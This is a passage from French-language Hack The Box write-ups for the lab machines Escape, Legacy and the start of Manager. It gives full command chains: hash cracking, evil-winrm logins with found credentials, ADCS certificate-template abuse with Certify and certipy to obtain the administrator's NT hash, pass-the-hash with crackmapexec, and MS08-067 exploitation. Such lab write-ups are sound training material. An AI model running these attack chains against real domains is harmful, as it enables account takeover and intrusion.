'sql_svc::sequel:a6a02dbbac9d28d3:ECBB0B14CAA499F1C21BE0F8105B7C71:010100000000000080EC7F76AEFED9011938B2AEE6D4806800000000020008003500510052004A0001001E00570049004E002D004200580055004C00330034004400470036005A00330004003400570049004E002D004200580055004C00330034004400470036005A0033002E003500510052004A002E004C004F00430041004C00030014003500510052004A002E004C004F00430041004C00050014003500510052004A002E004C004F00430041004C000700080080EC7F76AEFED90106000400020000000800300030000000000000000000000000300000A401AD8EFEE268390CFF1D1727512D9D2310CAB5E65EEEDB97C2684ACBF859020A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330035000000000000000000' /usr/share/wordlists/rockyou.txt.gz\n</code></pre> <pre><code>SQL_SVC::sequel:a6a02dbbac9d28d3:ecbb0b14caa499f1c21be0f8105b7c71:010100000000000080ec7f76aefed9011938b2aee6d4806800000000020008003500510052004a0001001e00570049004e002d004200580055004c00330034004400470036005a00330004003400570049004e002d004200580055004c00330034004400470036005a0033002e003500510052004a002e004c004f00430041004c00030014003500510052004a002e004c004f00430041004c00050014003500510052004a002e004c004f00430041004c000700080080ec7f76aefed90106000400020000000800300030000000000000000000000000300000a401ad8efee268390cff1d1727512d9d2310cab5e65eeedb97c2684acbf859020a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00330035000000000000000000:REGGIE1234ronnie\n</code></pre> <p>Et voil\u00e0 de nouveaux creds ! sql_svc:REGGIE1234ronnie, impeccable. On a vu pendant le nmap qu'il \u00e9tait possible de se connecter via winrm. Aller, \u00e7a se tente.</p> <pre><code>pak@kali:~$ evil-winrm -i sequel.htb -u \"sql_svc\" -p \"REGGIE1234ronnie\"\n\nEvil-WinRM shell v3.5\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                       \n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                         \n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\sql_svc\\Documents&gt; whoami /all\n\nUSER INFORMATION                                                                                                                           \n----------------                                                                                                                            \nUser Name      SID                                                                                                                        \n============== ==============================================                                                                              \nsequel\\sql_svc S-1-5-21-4078382237-1492182817-2568127209-1106                           \n\nGROUP INFORMATION                                                            \n-----------------                                                                       \nGroup Name                                  Type             SID          Attributes                                                       \n=========================================== ================ ============ ==================================================               \nEveryone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group               \nBUILTIN\\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group               \nBUILTIN\\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Plus Mandatory Level Label            S-1-16-8448\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n\n\nUSER CLAIMS INFORMATION\n-----------------------\n\nUser claims unknown.\n\nKerberos support for Dynamic Access Control on this device has been disabled.\n</code></pre> <p>Et \u00e0 partir de l\u00e0, j'ai un peu gal\u00e9r\u00e9 \u00e0 avancer... Notre utilisateur ne semble pas avoir de droits particulier \u00e0 premi\u00e8re vue, winpeas ne m'a pas sp\u00e9cialement aid\u00e9 autrement qu'en confirmant l'utilisation de certificat (mais rien de trouvable avec cet utilisateur). J'ai tent\u00e9 d'\u00e9num\u00e9rer des users kerberoastables mais rien de concluant non plus. </p> <p>Bon, je tourne un peu dans le syst\u00e8me \"\u00e0 la mano\", \u00e0 la recherche de trucs int\u00e9ressants... Jusqu'\u00e0 tomber sur ce fichier:</p> <pre><code>*Evil-WinRM* PS C:\\SQLServer\\Logs&gt; type ERRORLOG.BAK\n</code></pre> <p>On y trouve notamment cette ligne :  <pre><code>2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.\n2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]\n2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.\n2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]\n</code></pre></p> <p>On imagine donc que le password de 'sequel.htb\\Ryan.Cooper' puisse \u00eatre 'NuclearMosquito3'.</p> <pre><code>pak@kali:~$ crackmapexec winrm sequel.htb -u Ryan.Cooper -p 'NuclearMosquito3'\nSMB         dc.sequel.htb   5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)\nHTTP        dc.sequel.htb   5985   DC               [*] http://dc.sequel.htb:5985/wsman\nWINRM       dc.sequel.htb   5985   DC               [+] sequel.htb\\Ryan.Cooper:NuclearMosquito3 (Pwn3d!)\n</code></pre> <p>Let's go ! On se connecte, et on a enfin le flag utilisateur :). Je retente un peu d'\u00e9num\u00e9ration au cas o\u00f9, mais je ne trouve rien de particulier. C'est l\u00e0 que je me souviens de l'utilisation des certificats ! Tentons !</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents&gt; .\\Certify.exe find /vulnerable\n\n   _____          _   _  __\n  / ____|        | | (_)/ _|\n | |     ___ _ __| |_ _| |_ _   _\n | |    / _ \\ '__| __| |  _| | | |\n | |___|  __/ |  | |_| | | | |_| |\n  \\_____\\___|_|   \\__|_|_|  \\__, |\n                             __/ |\n                            |___./\n  v1.0.0\n\n[*] Action: Find certificate templates\n[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'\n\n[*] Listing info about the Enterprise CA 'sequel-DC-CA'\n\n    Enterprise CA Name            : sequel-DC-CA\n    DNS Hostname                  : dc.sequel.htb\n    FullName                      : dc.sequel.htb\\sequel-DC-CA\n    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED\n    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb\n    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56\n    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101\n    Cert Start Date               : 11/18/2022 12:58:46 PM\n    Cert End Date                 : 11/18/2121 1:08:46 PM\n    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb\n    UserSpecifiedSAN              : Disabled\n    CA Permissions                :\n      Owner: BUILTIN\\Administrators        S-1-5-32-544\n\n      Access Rights                                     Principal\n\n      Allow  Enroll                                     NT AUTHORITY\\Authenticated UsersS-1-5-11\n      Allow  ManageCA, ManageCertificates               BUILTIN\\Administrators        S-1-5-32-544\n      Allow  ManageCA, ManageCertificates               sequel\\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512\n      Allow  ManageCA, ManageCertificates               sequel\\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519\n    Enrollment Agent Restrictions : None\n\n[!] Vulnerable Certificates Templates :\n\n    CA Name                               : dc.sequel.htb\\sequel-DC-CA\n    Template Name                         : UserAuthentication\n    Schema Version                        : 2\n    Validity Period                       : 10 years\n    Renewal Period                        : 6 weeks\n    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT\n    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS\n    Authorized Signatures Required        : 0\n    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email\n    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights           : sequel\\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512\n                                      sequel\\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513\n                                      sequel\\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519\n      Object Control Permissions\n        Owner                       : sequel\\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500\n        WriteOwner Principals       : sequel\\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500\n                                      sequel\\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512\n                                      sequel\\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519\n        WriteDacl Principals        : sequel\\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500\n                                      sequel\\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512\n                                      sequel\\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519\n        WriteProperty Principals    : sequel\\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500\n                                      sequel\\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512\n                                      sequel\\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519\n\n\n\nCertify completed in 00:00:09.2906146\n</code></pre> <p>Donc, on a effectivement un certificat qui est vuln\u00e9rable : on devrait pouvoir request ce certificat sous le nom de l'administrateur et pouvoir faire quelque-chose :).</p> <p>Et en fait \u00e7a ne marche pas. Pourquoi ? Parce-qu'il faut que la date et l'heure soient synchronis\u00e9s au DC ! Une gal\u00e8re de comprendre le probl\u00e8me.</p> <pre><code>pak@kali:~$ sudo ntpdate -u dc.sequel.htb\n2023-10-14 23:48:42.383269 (+0200) +28799.624267 +/- 0.006328 dc.sequel.htb 10.129.81.126 s1 no-leap\nCLOCK: time stepped by 28799.624267\n</code></pre> <pre><code>pak@kali:~$ certipy-ad req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication\nCertipy v4.7.0 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 12\n[*] Got certificate with UPN 'administrator@sequel.htb'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'administrator.pfx'\n</code></pre> <pre><code>pak@kali:~$ certipy-ad auth -pfx administrator.pfx\nCertipy v4.7.0 - by Oliver Lyak (ly4k)\n\n[*] Using principal: administrator@sequel.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee\n</code></pre> <p>On a le hash admin, plus qu'\u00e0 aller r\u00e9cup\u00e9rer le flag :) !</p> <pre><code>pak@kali:~$ crackmapexec smb sequel.htb -u administrator -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee' -X 'type C:\\Users\\administrator\\Desktop\\root.txt'\nSMB         dc.sequel.htb   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)\nSMB         dc.sequel.htb   445    DC               [+] sequel.htb\\administrator:a52f78e4c751e5f5e17e1e9f3e58f4ee (Pwn3d!)\nSMB         dc.sequel.htb   445    DC               [+] Executed command \nSMB         dc.sequel.htb   445    DC               d53dd2e96d89f754ef6011361c07d015\n</code></pre>"},{"location":"Writeup/HTB/Machines/Legacy/","title":"Legacy","text":"Room Legacy Url https://app.hackthebox.com/machines/Legacy Sujets Network / Vulnerability assesment Active/Retired lors de la r\u00e9solution Retired Difficult\u00e9 Easy"},{"location":"Writeup/HTB/Machines/Legacy/#nmap","title":"Nmap","text":"<pre><code>PORT    STATE SERVICE     REASON  VERSION\n135/tcp open  msrpc       syn-ack Microsoft Windows RPC\n139/tcp open  netbios-ssn syn-ack Microsoft Windows netbios-ssn\n445/tcp open  \ufffdm`U       syn-ack Windows XP microsoft-ds\nService Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp\n\nHost script results:\n| p2p-conficker: \n|   Checking for Conficker.C or higher...\n|   Check 1 (port 40600/tcp): CLEAN (Couldn't connect)\n|   Check 2 (port 53966/tcp): CLEAN (Couldn't connect)\n|   Check 3 (port 50902/udp): CLEAN (Failed to receive data)\n|   Check 4 (port 47445/udp): CLEAN (Failed to receive data)\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\n| nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:7d:d3 (VMware)\n| Names:\n|   LEGACY&lt;00&gt;           Flags: &lt;unique&gt;&lt;active&gt;\n|   HTB&lt;00&gt;              Flags: &lt;group&gt;&lt;active&gt;\n|   LEGACY&lt;20&gt;           Flags: &lt;unique&gt;&lt;active&gt;\n|   HTB&lt;1e&gt;              Flags: &lt;group&gt;&lt;active&gt;\n|   HTB&lt;1d&gt;              Flags: &lt;unique&gt;&lt;active&gt;\n|   \\x01\\x02__MSBROWSE__\\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;\n| Statistics:\n|   00:50:56:b9:7d:d3:00:00:00:00:00:00:00:00:00:00:00\n|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00\n| smb-security-mode: \n|   account_used: &lt;blank&gt;\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n|_smb2-time: Protocol negotiation failed (SMB2)\n|_smb2-security-mode: Couldn't establish a SMBv2 connection.\n| smb-os-discovery: \n|   OS: Windows XP (Windows 2000 LAN Manager)\n|   OS CPE: cpe:/o:microsoft:windows_xp::-\n|   Computer name: legacy\n|   NetBIOS computer name: LEGACY\\x00\n|   Workgroup: HTB\\x00\n|_  System time: 2023-09-08T22:42:35+03:00\n|_clock-skew: mean: 5d00h27m39s, deviation: 2h07m17s, median: 4d22h57m38s\n</code></pre> <p>Du windows XP, du service SMB... Est-ce qu'on va vraiment aller chercher tr\u00e8s loin ? Je ne pense pas :). Confirmons la pr\u00e9sence de la CVE rapidement, pour le beau geste:</p> <pre><code>nmap -A --script=\"*vuln*\" -vv 10.10.10.4\n\nPORT    STATE SERVICE      REASON  VERSION\n135/tcp open  msrpc        syn-ack Microsoft Windows RPC\n139/tcp open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds syn-ack Microsoft Windows XP microsoft-ds\nService Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp\n\nHost script results:\n| smb-vuln-ms17-010: \n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|           \n|     Disclosure date: 2017-03-14\n|     References:\n|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\n|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED\n|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)\n|_smb-vuln-ms10-054: false\n| smb-vuln-ms08-067: \n|   VULNERABLE:\n|   Microsoft Windows system vulnerable to remote code execution (MS08-067)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2008-4250\n|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,\n|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary\n|           code via a crafted RPC request that triggers the overflow during path canonicalization.\n|           \n|     Disclosure date: 2008-10-23\n|     References:\n|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250\n</code></pre> <p>Tiens donc... Il ne reste plus qu'\u00e0 lancer metasploit (on ne va pas se prendre la t\u00eate), avec le module qui va bien: ms08_067_netapi, pour la CVE CVE-2008-4250.</p> <p>On entre les options ad\u00e9quates (qui se limitent au RHOST/LHOST...), run, hop on est root.</p>"},{"location":"Writeup/HTB/Machines/Manager/","title":"Manager","text":"Room Manager Url https://app.hackthebox.com/machines/Manager Sujets Windows/AD/ADCS Active/Retired lors de la r\u00e9solution Active Difficult\u00e9 Medium"},{"location":"Writeup/HTB/Machines/Manager/#nmap","title":"Nmap:","text":"<pre><code>53/tcp    open  domain        syn-ack Simple DNS Plus\n80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0\n| http-methods:\n|   Supported Methods: OPTIONS TRACE GET HEAD POST\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Manager\n88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-02-22 07:53:13Z)\n135/tcp   open  msrpc         syn-ack Microsoft Windows RPC\n139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn\n389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc01.manager.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb\n| Issuer: commonName=manager-DC01-CA/domainComponent=manager\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2023-07-30T13:51:28\n| Not valid after:  2024-07-29T13:51:28\n| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562\n| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb\n| -----BEGIN CERTIFICATE-----\n| MIIGMDCCBRigAwIBAgITXwAAAAnyIQ82Fp4XhwAAAAAACTANBgkqhkiG9w0BAQsF\n##SNIP##\n| 5U81h/XKD4e21fDdv4wge+LFubtqzOqOKWXlrOXcfdc7dBdRt+tD3bIcTO63AQFC\n| A0xH1Q==\n|_-----END CERTIFICATE-----\n|_ssl-date: 2024-02-22T07:54:42+00:00; +7h00m06s from scanner time.\n445/tcp   open  microsoft-ds? syn-ack\n464/tcp   open  kpasswd5?     syn-ack\n593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2024-02-22T07:54:43+00:00; +7h00m06s from scanner time.\n| ssl-cert: Subject: commonName=dc01.manager.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb\n| Issuer: commonName=manager-DC01-CA/domainComponent=manager\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2023-07-30T13:51:28\n| Not valid after:  2024-07-29T13:51:28\n| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562\n| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb\n| -----BEGIN CERTIFICATE-----\n| MIIGMDCCBRigAwIBAgITXwAAAAnyIQ82Fp4XhwAAAAAACTANBgkqhkiG9w0BAQsF\n##SNIP##\n| 5U81h/XKD4e21fDdv4wge+LFubtqzOqOKWXlrOXcfdc7dBdRt+tD3bIcTO63AQFC\n| A0xH1Q==\n|_-----END CERTIFICATE-----\n1433/tcp  open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000.00; RTM\n| ms-sql-ntlm-info:\n|   10.10.11.236:1433:\n|     Target_Name: MANAGER\n|     NetBIOS_Domain_Name: MANAGER\n|     NetBIOS_Computer_Name: DC01\n|     DNS_Domain_Name: manager.htb\n|     DNS_Computer_Name: dc01.manager.htb\n|     DNS_Tree_Name: manager.htb\n|_    Product_Version: 10.0.17763\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Issuer: commonName=SSL_Self_Signed_Fallback\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-02-22T07:50:26\n| Not valid after:  2054-02-22T07:50:26\n| MD5:   85f5:4fb8:7578:78df:69cf:b054:b2e7:29cc\n| SHA-1: 7523:daf4:c653:0918:f90e:036c:a73a:5019:1ff0:4793\n| -----BEGIN CERTIFICATE-----\n| MIIDADCCAeigAwIBAgIQNacWjVih9JNNmmJkQkeUsTANBgkqhkiG9w0BAQsFADA7\n##SNIP##\n| aYA/nOd7X6y07FoTCee6uFRAo89Q6TJO0YrkDjLYFx/IWxkPYugo6XX/WHNXzgJz\n| 94C4VA==\n|_-----END CERTIFICATE-----\n| ms-sql-info:\n|   10.10.11.236:1433:\n|     Version:\n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n|_ssl-date: 2024-02-22T07:54:42+00:00; +7h00m06s from scanner time.\n3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2024-02-22T07:54:42+00:00; +7h00m06s from scanner time.\n| ssl-cert: Subject: commonName=dc01.manager.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb\n| Issuer: commonName=manager-DC01-CA/domainComponent=manager\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2023-07-30T13:51:28\n| Not valid after:  2024-07-29T13:51:28\n| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562\n| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb\n| -----BEGIN CERTIFICATE-----\n| MIIGMDCCBRigAwIBAgITXwAAAAnyIQ82Fp4XhwAAAAAACTANBgkqhkiG9w0BAQsF\n##SNIP##\n| 5U81h/XKD4e21fDdv4wge+LFubtqzOqOKWXlrOXcfdc7dBdRt+tD3bIcTO63AQFC\n| A0xH1Q==\n|_-----END CERTIFICATE-----\n3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2024-02-22T07:54:43+00:00; +7h00m06s from scanner time.\n| ssl-cert: Subject: commonName=dc01.manager.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb\n| Issuer: commonName=manager-DC01-CA/domainComponent=manager\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2023-07-30T13:51:28\n| Not valid after:  2024-07-29T13:51:28\n| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562\n| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb\n| -----BEGIN CERTIFICATE-----\n| MIIGMDCCBRigAwIBAgITXwAAAAnyIQ82Fp4XhwAAAAAACTANBgkqhkiG9w0BAQsF\n##SNIP##\n| A0xH1Q==\n|_-----END CERTIFICATE-----\n5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        syn-ack .NET Message Framing\n49667/tcp open  msrpc         syn-ack Microsoft Windows RPC\n49669/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0\n49670/tcp open  msrpc         syn-ack Microsoft Windows RPC\n49671/tcp open  msrpc         syn-ack Microsoft Windows RPC\n49683/tcp open  tcpwrapped    syn-ack\n49732/tcp open  msrpc         syn-ack Microsoft Windows RPC\n64099/tcp open  msrpc         syn-ack Microsoft Windows RPC\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n</code></pre> <p>On ajoute le domaine \u00e0 notre fichier /etc/hosts:</p> <pre><code>10.10.11.236  manager.htb dc01.manager.htb\n</code></pre> <p>Je tente ensuite d'\u00e9num\u00e9rer les sous-domaines:</p> <pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://10.10.11.136 -H \"HOST: FUZZ.manager.htb\" \n</code></pre> <p>Mais sans r\u00e9sultat. Un dig du DNS ne renvoie rien non plus, et un feroxbuster du site ne donne rien de particulier:</p> <pre><code>pak@DESKTOP-AF1CU53:~$ feroxbuster -u http://manager.htb -w /usr/share/wordlists/dirb/big.txt\n\n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher \ud83e\udd13                 ver: 2.10.1\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfaf  Target Url            \u2502 http://manager.htb\n \ud83d\ude80  Threads               \u2502 50\n \ud83d\udcd6  Wordlist              \u2502 /usr/share/wordlists/dirb/big.txt\n \ud83d\udc4c  Status Codes          \u2502 All Status Codes!\n \ud83d\udca5  Timeout (secs)        \u2502 7\n \ud83e\udda1  User-Agent            \u2502 feroxbuster/2.10.1\n \ud83d\udc89  Config File           \u2502 /etc/feroxbuster/ferox-config.toml\n \ud83d\udd0e  Extract Links         \u2502 true\n \ud83c\udfc1  HTTP methods          \u2502 [GET]\n \ud83d\udd03  Recursion Depth       \u2502 4\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfc1  Press [ENTER] to use the Scan Management Menu\u2122\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET      224l      650w     7900c http://manager.htb/service.html\n200      GET      507l     1356w    18203c http://manager.htb/index.html\n200      GET       10l       42w     2704c http://manager.htb/images/call-o.png\n200      GET        4l       20w     1337c http://manager.htb/images/s-2.png\n200      GET        6l       22w     1052c http://manager.htb/images/location.png\n200      GET      165l      367w     5317c http://manager.htb/contact.html\n200      GET        9l       31w     2492c http://manager.htb/images/s-3.png\n200      GET        6l       20w     1360c http://manager.htb/images/location-o.png\n200      GET        9l       41w     2465c http://manager.htb/images/s-4.png\n200      GET      157l      414w     5386c http://manager.htb/about.html\n200      GET        6l       17w     1553c http://manager.htb/images/s-1.png\n200      GET        7l       29w     1606c http://manager.htb/images/envelope-o.png\n200      GET      614l     1154w    11838c http://manager.htb/css/style.css\n200      GET       10l       43w     2023c http://manager.htb/images/call.png\n200      GET       85l      128w     1389c http://manager.htb/css/responsive.css\n200      GET       14l       48w     3837c http://manager.htb/images/logo.png\n200      GET        9l       25w     1255c http://manager.htb/images/envelope.png\n200      GET      149l      630w    53431c http://manager.htb/images/client.jpg\n200      GET       82l      542w    56157c http://manager.htb/images/contact-img.jpg\n200      GET     4437l    10999w   131863c http://manager.htb/js/bootstrap.js\n200      GET        2l     1276w    88145c http://manager.htb/js/jquery-3.4.1.min.js\n200      GET    10038l    19587w   192348c http://manager.htb/css/bootstrap.css\n403      GET       29l       92w     1233c http://manager.htb/css/\n403      GET       29l       92w     1233c http://manager.htb/images/\n403      GET       29l       92w     1233c http://manager.htb/js/\n200      GET     1313l     7384w   563817c http://manager.htb/images/about-img.png\n200      GET      507l     1356w    18203c http://manager.htb/\n301      GET        2l       10w      149c http://manager.htb/Images =&gt; http://manager.htb/Images/\n301      GET        2l       10w      146c http://manager.htb/css =&gt; http://manager.htb/css/\n301      GET        2l       10w      149c http://manager.htb/images =&gt; http://manager.htb/images/\n301      GET        2l       10w      145c http://manager.htb/js =&gt; http://manager.htb/js/\n</code></pre> <p>On regarde du c\u00f4t\u00e9 de smb, pour voir si \u00e9ventuellement on aurait acc\u00e8s \u00e0 un partage particulier : <pre><code>pak@DESKTOP-AF1CU53:~$ smbclient -L 10.10.11.236\nPassword for 